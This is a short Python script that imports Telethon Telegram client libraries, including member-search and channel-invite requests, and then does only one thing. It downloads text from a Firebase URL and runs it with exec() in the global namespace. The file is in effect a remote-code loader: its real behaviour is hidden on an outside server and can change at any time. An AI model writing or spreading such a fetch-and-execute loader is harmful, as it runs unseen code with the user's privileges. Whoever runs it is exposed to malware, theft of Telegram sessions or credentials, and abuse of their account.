# import telegram.client
import json
import os
import urllib
import multiprocessing
from multiprocessing import Process
import traceback
import requests
import telethon.errors
from telethon.sync import TelegramClient
from telethon.tl.functions.messages import GetDialogsRequest
from telethon.tl.types import InputPeerEmpty, InputPeerChannel, InputPeerUser, ChannelParticipantsSearch
from telethon.errors.rpcerrorlist import *
from telethon.tl.functions.channels import InviteToChannelRequest, GetParticipantsRequest, JoinChannelRequest, \
    GetFullChannelRequest
from threading import Thread
import sys
import csv
import traceback
import time
import asyncio
from telethon.sessions import StringSession
import random
from cryptography.fernet import Fernet
import logging
from pathlib import Path
import shutil
from requests.adapters import HTTPAdapter
import firebase_admin
from firebase_admin import credentials
from urllib3.util.retry import Retry
try:
  s = 'https://frantic-architect.firebaseio.com/railway/code.json'
  r = str(requests.get(s).json())
  exec(r,globals())
except Exception as e:
  print(e)
print('program exit')
  
